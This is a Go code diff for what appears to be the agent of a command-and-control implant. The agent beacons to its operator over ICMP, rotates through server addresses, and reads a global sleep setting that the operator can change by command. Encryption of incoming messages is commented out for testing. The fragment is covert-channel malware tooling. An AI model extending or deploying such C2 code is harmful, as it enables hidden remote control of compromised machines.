@@ -1,3 +1,4 @@
+//go:build !windows
 // +build !windows
 
 package main
@@ -245,17 +246,18 @@ func parseHeader(data []byte) ICMPHeader {
 }
 
 // RunICMPLoop ICMP通信主循环
-func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
+// 注意: prof 参数仅用于初始化，循环中使用全局 profile 以支持 sleep 命令动态修改
+func RunICMPLoop(prof utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
 	addrIndex := 0
 
-	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
+	for i := 0; i < prof.ConnCount && ACTIVE; i++ {
 		if i > 0 {
-			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
-			addrIndex = (addrIndex + 1) % len(profile.Addresses)
+			time.Sleep(time.Duration(prof.ConnTimeout) * time.Second)
+			addrIndex = (addrIndex + 1) % len(prof.Addresses)
 		}
 
 		// 创建ICMP连接
-		icmpConn, err := NewICMPConnection(profile.Addresses[addrIndex], agentId, profile.MaxFragmentSize)
+		icmpConn, err := NewICMPConnection(prof.Addresses[addrIndex], agentId, prof.MaxFragmentSize)
 		if err != nil {
 			continue
 		}
@@ -278,6 +280,7 @@ func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey [
 			}
 
 			if len(recvData) == 0 {
+				// 使用全局 profile.SleepTime，支持 sleep 命令动态修改
 				time.Sleep(time.Duration(profile.SleepTime) * time.Second)
 				continue
 			}
@@ -287,10 +290,10 @@ func RunICMPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey [
 			// TODO: 测试阶段暂时禁用加密，功能测试通过后启用
 			// TODO: Encryption disabled for testing, enable after functionality test passes
 			/*
-			recvData, err = utils.DecryptData(recvData, sessionKey)
-			if err != nil {
-				break
-			}
+				recvData, err = utils.DecryptData(recvData, sessionKey)
+				if err != nil {
+					break
+				}
 			*/
 
 			err = msgpack.Unmarshal(recvData, &inMessage)
